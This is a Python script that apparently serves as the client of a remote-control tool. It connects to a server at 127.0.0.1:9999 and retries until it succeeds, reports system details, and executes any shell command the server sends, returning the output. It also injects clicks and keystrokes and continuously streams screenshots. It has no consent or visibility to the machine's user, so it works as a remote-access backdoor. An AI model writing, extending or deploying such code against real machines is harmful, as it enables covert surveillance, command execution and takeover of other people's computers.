import socket, cv2, pickle, struct, numpy as np, time, platform, threading, subprocess, os

# Try to import GUI tools, fail gracefully for iSH/Mobile
try:
    import pyautogui
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connected = False
while not connected:
    try:
        client.connect(("127.0.0.1", 9999))
        connected = True
    except:
        time.sleep(2)

mode = "GUI" if HAS_GUI else "SHELL"
info = f"{mode} | {platform.system()} ({platform.node()})"
client.send(info.encode().ljust(64))

def listen_commands():
    while True:
        try:
            data = client.recv(1024).decode()
            if HAS_GUI and data.startswith("CLICK:"):
                _, side, x, y = data.split(":")
                pyautogui.click(int(x), int(y), button=side)
            elif HAS_GUI and data.startswith("KEY:"):
                key = data.split(":")[1]
                if len(key) > 1: pyautogui.press(key.lower())
                else: pyautogui.write(key)
            elif data.startswith("CMD:"):
                cmd = data.split(":", 1)[1]
                output = subprocess.getoutput(cmd)
                client.send(f"OUT:{output}".encode())
        except: break

threading.Thread(target=listen_commands, daemon=True).start()

try:
    if HAS_GUI:
        while True:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            res, enc = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
            data = pickle.dumps(enc)
            client.sendall(struct.pack("Q", len(data)) + data)
    else:
        # Keep connection alive for Shell mode
        while True:
            time.sleep(10)
except: pass
finally: client.close()
